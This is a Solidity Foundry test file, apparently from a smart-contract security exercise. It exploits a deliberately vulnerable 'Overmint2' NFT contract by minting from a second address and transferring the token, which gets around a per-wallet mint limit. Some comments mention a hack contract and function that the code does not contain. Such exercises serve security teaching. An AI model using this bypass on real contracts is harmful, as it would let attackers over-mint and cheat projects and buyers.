// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/ReentrancyAttacks/Overmint2.sol";

/*
 * @dev This contract is a test contract for the Overmint2Hack contract.
 */
contract Overmint2HackTest is Test {
    Overmint2 private nft;

    /**
     * @dev Sets up the test environment by creating instances of Overmint2Hack, and Overmint2 contracts.
     */
    function setUp() public {
        nft = new Overmint2();
    }

    /*
     * Initiates the hack by calling the `hack` function on the Overmint2 contract.
     */
    function testHackMint() public {
        // Set up
        address hacker1 = vm.addr(1);
        address hacker2 = vm.addr(2);
        vm.startBroadcast(hacker1);

        // Call the functions
        for (uint i = 0; i < 4; i++) {
            nft.mint();
        }
        vm.stopBroadcast();
        vm.startBroadcast(hacker2);
        nft.mint();
        nft.transferFrom(hacker2, hacker1, nft.totalSupply());
        vm.stopBroadcast();

        // Verify the effects
        vm.prank(hacker1);
        assertTrue(nft.success());
    }
}
